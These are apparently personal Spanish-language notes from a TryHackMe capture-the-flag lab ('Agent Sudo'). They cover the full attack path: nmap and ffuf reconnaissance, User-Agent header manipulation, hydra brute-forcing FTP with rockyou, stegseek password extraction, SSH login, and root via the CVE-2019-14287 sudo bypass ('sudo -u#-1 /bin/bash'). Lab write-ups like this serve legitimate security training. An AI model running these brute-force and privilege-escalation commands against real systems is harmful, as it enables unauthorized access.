# Agent Sudo
- THM -> 10.128.166.133
- nmap -sCV -Pn 10.128.166.133
- 21 ftp, 22 ssh, 80 http y miramos código fuente
- ffuf -u http://10.128.166.133/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt y posteriormnete medium ( solo index.php )
- Al entrar en la web nos pone
- Dear agents,

Use your own codename as user-agent to access the site.

From,
Agent R 

- Hay que interceptar la petición y cambiar el header de la petición user-agent y probar (esto viene del agente R)
- Probamos con R y cambia el mensaje, diferentes pruebas y nada -> al intruder y probamos de la a a la z y miramos si cambia la longitud de la respuesta.
- Con la letra C si cambia el mensaje y veo los headers -> agent_C_attention.php.
- Veo el siguiente mensaje:

- Attention chris,

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!

From,
Agent R 
- Chris contraseña débil y R y J tienen un acuerdo.
- Probamos fuerza bruta en ftp con chris
- hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.128.166.133
- [21][ftp] host: 10.128.166.133   login: chris   password: X
- ACcedemos a ftp y nios traemos 3 archivos de chris.
- estonografia un emensaje diciendo que la contrasseña esta en las fotos
- stegseek cute-alien.jpg -> y en el output veo │
- Hi james,
   2 │ 
   3 │ Glad you find this message. Your login password is hackerrules!
   4 │ 
   5 │ Don't ask me why the password look cheesy, ask agent R who set this password for you.
   6 │ 
   7 │ Your buddy,
   8 │ chris

- habria q ver la otra foto dado a que es un .png
- ssh james@10.128.166.133 y contraseña listo estamos dentro
- Pillamos flag y nos enviamos con scp una imagen le aplicamos stegseek y vemos que el nombre de l aimagen es Roswell alien autopsy
- sudo -l y vemos que tenemos /bin/bash como sudo jaaja -> james@agent-sudo:~$ sudo /bin/bash Sorry, user james is not allowed to execute '/bin/bash' as root on agent-sudo.james@agent-sudo:~$ sudo -u chris /bin/bash
- cambiamos al otro user que conocemos dado a que no deja esta capado james (bloqqueado) y tampoco deja ejecutar sudo con ese user. 
- Busco por CVE -> james@agent-sudo:~$ sudo --version Sudo version 1.8.21p2 -> ENCUENTRO CVE-2019-14287 y es simplemente ejcutar -> sudo -u#-1 /bin/bash
- DIRectorio root y listo pillamos flag
